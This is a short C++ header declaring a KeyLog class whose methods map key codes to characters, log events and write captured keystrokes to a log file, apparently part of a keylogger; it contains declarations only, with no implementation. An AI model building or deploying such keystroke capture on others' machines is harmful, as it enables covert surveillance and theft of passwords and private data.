#pragma once

class KeyLog {
public:
    static bool CreateDirectoryRecursive(const std::string& directoryPath);
    static void logEvents();
    //static void logMouseEvents(HANDLE logFile);
    //static void logKeyboardInfo(HANDLE logFile);
    static std::string mapKey(int key, bool shiftPressed, bool capsLock);
    static void logKeyToFile(const std::string& logfile, const std::string& data);

};
